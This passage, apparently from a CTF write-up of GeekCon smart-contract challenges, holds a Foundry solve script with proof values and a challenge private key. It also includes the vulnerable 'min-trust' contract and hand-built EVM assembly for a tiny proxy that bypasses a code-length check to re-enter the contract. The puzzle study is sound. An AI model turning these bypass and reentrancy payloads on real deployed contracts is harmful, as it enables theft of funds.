style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.20&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Script} from &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {console} from &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;..&#x2F;src&#x2F;chall.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;solve &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Script &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;run &lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Challenge c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Challenge&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xdE658b81E3121a6ba399d9Bc7bc460A2e0Be231f&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;memory&lt;&#x2F;span&gt;&lt;span&gt; _pA &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x02afe3b6af05f5f6322bc9ad5a883bb04074843087ec0358627413e5f168838d&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x13e141ab596af7e38b6fb17a5b2f16e899d9fa8cf05e504d42322999f410924d
&lt;&#x2F;span&gt;&lt;span&gt;        ];
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;memory&lt;&#x2F;span&gt;&lt;span&gt; _pB &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;                [
&lt;&#x2F;span&gt;&lt;span&gt;                        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x0828a2daaf75f4160abcdb92a458d7db3ab1db83d98bed5ad5964091f3a73758&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x1a6b94a64c03ed6b2668e4fbd3243824ef64c95052460ab84479f2884af3604f
&lt;&#x2F;span&gt;&lt;span&gt;                ],
&lt;&#x2F;span&gt;&lt;span&gt;                [
&lt;&#x2F;span&gt;&lt;span&gt;                        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x0035455651cf9dd0d29bc8184609a5cef8171c5434169cf98c8d18520582acf3&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x015c09d506fcd7fd20dd82fffa2f3c78f6f95fa2c22234eab265c60f2f4c68c1
&lt;&#x2F;span&gt;&lt;span&gt;                ]
&lt;&#x2F;span&gt;&lt;span&gt;        ];
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;memory&lt;&#x2F;span&gt;&lt;span&gt; _pC &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x181285ceff213dc0d955aea8282f53f076cd3c9651d833b2b0bbb5ded7a4ca49&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x178d85a5599cc5b6aa74da0bcf829065d2c23f042ee955fe22a4207b66e70856
&lt;&#x2F;span&gt;&lt;span&gt;        ];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        c.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;verifyProof&lt;&#x2F;span&gt;&lt;span&gt;(_pA, _pB, _pC);
&lt;&#x2F;span&gt;&lt;span&gt;        console.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(c.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;isSolved&lt;&#x2F;span&gt;&lt;span&gt;());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;powershell&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-powershell &quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span&gt;forge script solve &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;--&lt;&#x2F;span&gt;&lt;span&gt;broadcast &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;--&lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;url http:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;43.156&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;79.241&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;40545&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;ZUlLbCLSlLnlMQgBMEDKPBJo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;geekcon &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;--&lt;&#x2F;span&gt;&lt;span&gt;private&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x72da9f39e0a4c554024d7b44f864799e15f17dfff784a1a9e0c3d3995a439a50
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The network is a bit slow,&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; call 0xdE658b81E3121a6ba399d9Bc7bc460A2e0Be231f --rpc-url http:&#x2F;&#x2F;43.156.79.241:40545&#x2F;ZUlLbCLSlLnlMQgBMEDKPBJo&#x2F;geekcon  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;isSolved()&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;0x0000000000000000000000000000000000000000000000000000000000000001
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;min-trust&quot;&gt;min-trust&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.13&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Challenge &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    mapping (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt; secret;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool public&lt;&#x2F;span&gt;&lt;span&gt; privileged;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool public&lt;&#x2F;span&gt;&lt;span&gt; isSolved;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 constant&lt;&#x2F;span&gt;&lt;span&gt; trustedCodeLength &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x8&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotEOA&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Not1337&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotSuccess&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotTrusted&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Privileged&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotPrivileged&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;vulnerable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;untrusted) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        if (untrusted.code.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;length &amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; trustedCodeLength) revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotTrusted&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        privileged &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; success,) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; untrusted.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span&gt; success) revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotSuccess&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        privileged &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cheat&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;password) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span&gt; privileged) revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotPrivileged&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        secret[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; password;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sendFlag&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        if (privileged) revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Privileged&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;.code.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;length != &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotEOA&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        if (secret[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x1337&lt;&#x2F;span&gt;&lt;span&gt;) revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Not1337&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        isSolved &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;0X8 &lt;&#x2F;code&gt; How to make an external call… There should be 7 data on the call instruction stack. One instruction pushes only &lt;code&gt;PUSH0&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Using &lt;code&gt;CREATE &lt;&#x2F;code&gt; in a newly created contract may be sufficient&lt;&#x2F;p&gt;
&lt;p&gt;It is not suitable to use forge because it cannot handle two deployments at the same address. However, this feature is about to be abandoned&lt;&#x2F;p&gt;
&lt;p&gt;The main problem is how to implement &lt;code&gt;reentrancy proxy &lt;&#x2F;code&gt; in 8 bytes. In order to compress the bytecode as much as possible, we only need to ensure that the &lt;code&gt;runtime code &lt;&#x2F;code&gt; can initiate external calls. The stack depth of &lt;code&gt;0xF1 CALL &lt;&#x2F;code&gt; and &lt;code&gt;0xF2 CALLCODE &lt;&#x2F;code&gt; is 7, which can be basically abandoned.&lt;&#x2F;p&gt;
&lt;p&gt;Instead, try &lt;code&gt;0xF0 CREATE &lt;&#x2F;code&gt; with a stack depth of 3, but first load the bytecode of the new contract in &lt;code&gt;memory &lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Both value and offset can be 0, and &lt;code&gt;0x5F PUSH0 &lt;&#x2F;code&gt; consumes two bytes;&lt;&#x2F;li&gt;
&lt;li&gt;Size requires pushX + operand, consuming two bytes.&lt;&#x2F;li&gt;
&lt;li&gt;Processing new contract bytecode requires push storage offset, load storage, push memory offset, mstore, at least four bytes.&lt;&#x2F;li&gt;
&lt;li&gt;Add the last CREATE byte.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;There are a total of nine, …&lt;&#x2F;p&gt;
&lt;p&gt;Maybe optimize the size handling… like with &lt;code&gt;0x46 CHAINID &lt;&#x2F;code&gt; or &lt;code&gt;0x43 NUMBER &lt;&#x2F;code&gt;(can generate garbage transaction control). and then we get the proxy1’s runtimecode.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;SLOAD
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;MSTORE
&lt;&#x2F;span&gt;&lt;span&gt;NUMBER
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;CREATE
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Looking at the proxy in the first layer, the byte constraint of layer 2 will be 32 bytes given by the load storage process. But it should be enough&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Gas: should be set as large as possible, If a call tries to send more, the &lt;code&gt;gas &lt;&#x2F;code&gt; is changed to match the maximum allowed. PUSH4 0xFFFFFFFF, 5 bytes&lt;&#x2F;li&gt;
&lt;li&gt;Address: PUSH20 + address, 21 bytes&lt;&#x2F;li&gt;
&lt;li&gt;Value: PUSH0&lt;&#x2F;li&gt;
&lt;li&gt;argsOffset: PUSH0&lt;&#x2F;li&gt;
&lt;li&gt;argsSize: PUSH0&lt;&#x2F;li&gt;
&lt;li&gt;retOffset: PUSH0&lt;&#x2F;li&gt;
&lt;li&gt;retSize: PUSH0&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Then the last call. Exactly 32Bytes.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;del&gt;Will not returning runtime code cause revert?&lt;&#x2F;del&gt; No&lt;&#x2F;p&gt;
&lt;p&gt;proxy2 &lt;code&gt;initialize code&lt;&#x2F;code&gt;（it wont return any code):&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;PUSH20 0xBEBEBEBEBEBEBEBEBEBEBEBEBEBEBEBEBEBEBEBE
&lt;&#x2F;span&gt;&lt;span&gt;PUSH4 0xFFFFFFFF
&lt;&#x2F;span&gt;&lt;span&gt;CALL
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The second level proxy has a total of 32bytes. Transactions can be sent when testing creation&lt;&#x2F;p&gt;
&lt;p&gt;proxy1 &lt;code&gt;initialize code &lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;&lt;span&gt;&#x2F;&#x2F; Put the beginning of the code to the expected value
&lt;&#x2F;span&gt;&lt;span&gt;PUSH32 0x5F5F5F5F5F73BEBEBEBEBEBEBEBEBEBEBEBEBEBEBEBEBEBEBEBE63FFFFFFFFF1
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;SSTORE
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; copy runtime code to memory
&lt;&#x2F;span&gt;&lt;span&gt;PUSH1 0x08
&lt;&#x2F;span&gt;&lt;span&gt;PUSH1 0x2D
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0 
&lt;&#x2F;span&gt;&lt;span&gt;CODECOPY
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; return runtime code
&lt;&#x2F;span&gt;&lt;span&gt;PUSH1 0x08
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;RETURN
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; runtime code
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;SLOAD
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;MSTORE
&lt;&#x2F;span&gt;&lt;span&gt;NUMBER
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;CREATE
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;em&gt;I have some problems that cannot be debugged using the web version of Remix. . If you also encounter this, you can consider using the desktop version&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Reentrance flow chart:&lt;&#x2F;p&gt;
